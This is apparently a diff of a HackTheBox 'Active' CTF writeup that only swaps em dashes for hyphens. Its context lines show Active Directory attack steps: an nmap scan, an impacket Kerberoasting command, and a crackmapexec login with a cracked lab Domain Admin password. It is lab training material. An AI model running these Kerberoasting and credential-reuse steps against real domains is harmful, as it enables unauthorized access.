@@ -1,6 +1,6 @@
 ---
 slug: "htb-active"
-title: "Active — HackTheBox Machine Writeup"
+title: "Active - HackTheBox Machine Writeup"
 date: "2026-08-06"
 platform: "HackTheBox"
 type: "Machine"
@@ -56,10 +56,10 @@ import { KillChain, SpoilerFlag, SkillMatrix } from "@/components/cyber/WriteupC
 />
 
 <Callout type="info">
-  **Tool of Choice:** All Active Directory graph parsing and attack-path detection in this walkthrough was executed using **pharaohound** — our high-performance BloodHound JSON analysis engine & AD collection framework. It eliminates the heavy Neo4j GUI stack and instantly surfaced Kerberoasting as the #1 priority attack vector.
+  **Tool of Choice:** All Active Directory graph parsing and attack-path detection in this walkthrough was executed using **pharaohound** - our high-performance BloodHound JSON analysis engine & AD collection framework. It eliminates the heavy Neo4j GUI stack and instantly surfaced Kerberoasting as the #1 priority attack vector.
 </Callout>
 
-## Initial Inspection — Reconnaissance
+## Initial Inspection - Reconnaissance
 
 ### Host Discovery & DNS Configuration
 
@@ -82,14 +82,14 @@ kali@htb:~$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 
       -sC -sV -T4 -Pn 10.129.56.54 -oN scans/services.txt
 ```
 
-![Service scan results — the DC fingerprint](https://i.imgur.com/QZ4OFvy.png)
+![Service scan results - the DC fingerprint](https://i.imgur.com/QZ4OFvy.png)
 
 ### Exposed Service Profile
 
 | Port | Service | Role / Significance |
 |------|---------|---------------------|
-| 88 | Kerberos | Authentication server — primary Kerberoasting target |
-| 139 / 445 | SMB | Server Message Block — anonymous share access |
+| 88 | Kerberos | Authentication server - primary Kerberoasting target |
+| 139 / 445 | SMB | Server Message Block - anonymous share access |
 | 389 | LDAP | Lightweight Directory Access Protocol (`active.htb`) |
 | 3268 | Global Catalog | Multi-domain AD directory queries |
 
@@ -221,15 +221,15 @@ And we now can use our tool **pharaohound** because of fast execution, zero Neo4
 kali@htb:~$ pharaohound bloodhound/ -o pharaohound-report/ --all --no-color
 ```
 
-![pharaohound analysis — Kerberoastable user flagged as Priority #1](https://i.imgur.com/jjpPxNI.png)
+![pharaohound analysis - Kerberoastable user flagged as Priority #1](https://i.imgur.com/jjpPxNI.png)
 
 ```text
 [CRITICAL] KERBEROASTABLE USERS
   Summary:      Found 1 accounts with SPNs (1 in high-value groups)
-  Action:       User has an SPN — Kerberoastable
+  Action:       User has an SPN - Kerberoastable
   Command:      impacket-GetUserSPNs <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -request -dc-ip <DC_IP>
 
-[Priority #1] [CRITICAL] IMMEDIATE — Kerberoasting
+[Priority #1] [CRITICAL] IMMEDIATE - Kerberoasting
   Vulnerable Condition: Request TGS tickets for SPN-enabled accounts and crack them
                         offline. Focus first on high-value group members.
   Action Command:       impacket-GetUserSPNs ... -request -dc-ip <DC_IP> -outputfile hashes.txt
@@ -242,7 +242,7 @@ kali@htb:~$ pharaohound bloodhound/ -o pharaohound-report/ --all --no-color
   **Why pharaohound accelerates AD engagements:** Instead of manually querying LDAP or navigating complex Neo4j Cypher graphs, **pharaohound** parsed all 7 BloodHound JSON files in milliseconds. It automatically identified that the account `Administrator` had an active SPN (`active/CIFS:445`) and flagged it as **Priority #1 Kerberoasting Target**.
 </Callout>
 
-## Kerberoasting — The TGS Trapdoor
+## Kerberoasting - The TGS Trapdoor
 
 ### Ticket Extraction
 
@@ -304,7 +304,7 @@ kali@htb:~$ crackmapexec smb 10.129.56.54 -u Administrator -p 'Ticketmaster1968'
 SMB   10.129.56.54   445    DC    [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
 ```
 
-![Administrator is Domain Admin — Pwn3d!](https://i.imgur.com/2gUs1oM.png)
+![Administrator is Domain Admin - Pwn3d!](https://i.imgur.com/2gUs1oM.png)
 
 The `(Pwn3d!)` indicator confirms local administrative control on the Domain Controller, translating to full Domain Admin authority across `active.htb`.
 
@@ -333,9 +333,9 @@ C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 
 ## References
 
-- [pharaohound — BloodHound JSON Analysis Engine & AD Collection Framework](https://github.com/asbawy/pharaohound)
+- [pharaohound - BloodHound JSON Analysis Engine & AD Collection Framework](https://github.com/asbawy/pharaohound)
 - [Active Directory Exploitation & Enumeration Cheatsheet](/cheatsheet/Active%20Directory/Active_Directory_Cheatsheet)
 - [BadSuccessor: Active Directory Attack Vectors Log](/logs/badsuccessor)
-- [Microsoft MS14-025 — GPP cpassword vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2014-1812)
-- [Kerberoasting — Attack & Defense (SpecterOps)](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
-- [HackTheBox — Active machine page](https://www.hackthebox.com/machines/active)
+- [Microsoft MS14-025 - GPP cpassword vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2014-1812)
+- [Kerberoasting - Attack & Defense (SpecterOps)](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
+- [HackTheBox - Active machine page](https://www.hackthebox.com/machines/active)
